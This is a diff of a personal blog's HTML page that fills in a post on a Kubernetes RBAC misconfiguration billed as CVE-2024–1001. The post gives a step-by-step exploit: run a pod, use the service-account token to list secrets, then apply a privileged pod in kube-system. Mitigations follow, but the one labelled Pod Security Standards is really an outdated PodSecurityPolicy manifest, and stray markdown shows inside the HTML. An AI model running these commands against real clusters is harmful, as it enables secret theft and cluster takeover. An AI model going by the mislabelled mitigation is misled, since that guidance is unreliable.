@@ -3,52 +3,170 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Blog Post 1</title>
+  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>
 
-  <!-- Link to the same style for light/dark mode -->
+  <!-- Link to the common style for light/dark mode -->
   <link rel="stylesheet" href="style.css" />
 </head>
-<body class="light"><!-- Default theme is 'light' -->
+<body class="dark">
 
   <!-- NAVBAR -->
   <nav class="navbar">
     <div class="container nav-container">
-      <div class="logo">Hem Parekh's Hack-Space</div>
+      <div class="logo">Hem Parekh's Blog</div>
       <ul class="nav-links">
         <li><a href="index.html#home">Home</a></li>
         <li><a href="index.html#about">About</a></li>
         <li><a href="index.html#experience">Experience</a></li>
         <li><a href="index.html#projects">Projects</a></li>
-        <li><a href="index.html#contact">Contact</a></li>
-        <!-- Blog page link -->
-        <li><a href="blog.html">Blog</a></li>
+        <li><a href="blogs.html" class="active">Blog</a></li>
       </ul>
       <!-- Theme Toggle Button -->
-      <button class="theme-toggle" id="themeToggle">Dark Mode</button>
+      <button class="theme-toggle" id="themeToggle">Light Mode</button>
     </div>
   </nav>
 
-  <!-- SINGLE BLOG POST SECTION -->
+  <!-- BLOG POST HEADER -->
+  <header class="blog-post-header">
+    <div class="container">
+      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
+      <p class="blog-post-date">Published on: January 1, 2024</p>
+    </div>
+  </header>
+
+  <!-- BLOG POST CONTENT -->
   <section class="blog-post-content">
     <div class="container">
-      <h1>Blog Title One</h1>
-      <p class="post-date">Published on: January 1, 2024</p>
-
-      <img 
-        src="https://via.placeholder.com/800x400/eee/333?text=Blog+Image" 
-        alt="Blog Cover" 
-        class="blog-cover"
-      >
 
       <div class="blog-text">
+        <h2>What is CVE-2024–1001?</h2>
         <p>
-          Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
-          Curabitur auctor, nulla at hendrerit pharetra, lorem tellus tristique mauris, 
-          sed interdum urna ipsum in metus...
+          Kubernetes heavily relies on <b>Role-Based Access Control (RBAC)</b> to manage permissions. However, 
+          **CVE-2024–1001**, disclosed in early 2024, highlights how misconfigured RBAC rules can allow attackers 
+          to escalate privileges and compromise entire Kubernetes clusters. This vulnerability demonstrates the risks 
+          associated with overly permissive access policies.
         </p>
+
+        <h2>Understanding RBAC in Kubernetes</h2>
         <p>
-          Continue writing your blog content here. You can break it into multiple paragraphs, 
-          include images, code snippets, etc.
+          RBAC allows administrators to define "who" can access "what" in a Kubernetes cluster and "how" they can interact 
+          with those resources. Permissions are defined using **Roles**, **ClusterRoles**, and **RoleBindings**. 
+          Misconfigurations in these policies often lead to vulnerabilities like CVE-2024–1001.
+        </p>
+
+        <h2>The Vulnerability</h2>
+        <p>
+          CVE-2024–1001 occurs when RBAC configurations grant excessive permissions, such as "create" or "patch" 
+          on sensitive resources (e.g., Pods, Secrets). Attackers can exploit these misconfigurations to deploy 
+          malicious workloads, extract secrets, or gain control of the cluster API server.
+        </p>
+
+        <h2>Exploit Workflow</h2>
+        <h3>Prerequisites</h3>
+        <ul>
+          <li>Access to a Kubernetes namespace with weak RBAC configurations.</li>
+          <li>Ability to authenticate as a low-privileged user or service account.</li>
+        </ul>
+
+        <h3>Step-by-Step Exploit</h3>
+
+        <h4>1. Gain Initial Access</h4>
+        <p>
+          Assume the attacker has access to a low-privileged service account in the namespace, bound to an overly permissive Role.
+        </p>
+
+        <h4>2. Create a Malicious Pod</h4>
+        <div class="code-block">
+          <code>
+            kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
+          </code>
+        </div>
+
+        <h4>3. Access Sensitive Secrets</h4>
+        <p>
+          Once the Pod is running, the attacker can exec into it and extract secrets:
+        </p>
+        <div class="code-block">
+          <code>
+            kubectl exec -it malicious-pod -- /bin/sh<br>
+            curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \ <br>
+            https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
+          </code>
+        </div>
+
+        <h4>4. Escalate Privileges</h4>
+        <p>
+          The attacker can create a privileged Pod in the kube-system namespace to gain further access:
+        </p>
+        <div class="code-block">
+          <code>
+            kubectl apply -f - <<EOF<br>
+            apiVersion: v1<br>
+            kind: Pod<br>
+            metadata:<br>
+              name: root-access-pod<br>
+              namespace: kube-system<br>
+            spec:<br>
+              containers:<br>
+              - name: root-access-container<br>
+                image: alpine<br>
+                securityContext:<br>
+                  privileged: true<br>
+                command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
+            EOF
+          </code>
+        </div>
+
+        <h4>5. Cluster Takeover</h4>
+        <p>
+          With privileged access, the attacker can deploy ransomware, exfiltrate data, or modify the cluster's configuration.
+        </p>
+
+        <h2>Mitigation Strategies</h2>
+        <h3>1. Enforce the Principle of Least Privilege</h3>
+        <p>
+          Grant only the minimum permissions necessary for users and service accounts to perform their tasks.
+        </p>
+
+        <h3>2. Audit RBAC Policies</h3>
+        <p>
+          Regularly audit RBAC configurations to identify overly permissive Roles and ClusterRoles:
+        </p>
+        <div class="code-block">
+          <code>
+            kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
+          </code>
+        </div>
+
+        <h3>3. Use Pod Security Standards</h3>
+        <p>
+          Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
+        </p>
+        <div class="code-block">
+          <code>
+            apiVersion: policy/v1beta1<br>
+            kind: PodSecurityPolicy<br>
+            metadata:<br>
+              name: restricted<br>
+            spec:<br>
+              privileged: false
+          </code>
+        </div>
+
+        <h3>4. Enable Logging and Monitoring</h3>
+        <p>
+          Monitor for suspicious activities such as unauthorized Pod creation or access to secrets. Use tools like 
+          **Falco** or **Kubernetes Audit Logs** for better visibility.
+        </p>
+
+        <h3>5. Use Network Policies</h3>
+        <p>
+          Restrict Pod-to-Pod communication using **Kubernetes Network Policies** to minimize the attack surface.
+        </p>
+
+        <p>
+          CVE-2024–1001 serves as a critical reminder of the importance of secure RBAC configurations in Kubernetes. By 
+          implementing best practices, organizations can significantly reduce their exposure to such vulnerabilities.
         </p>
       </div>
     </div>
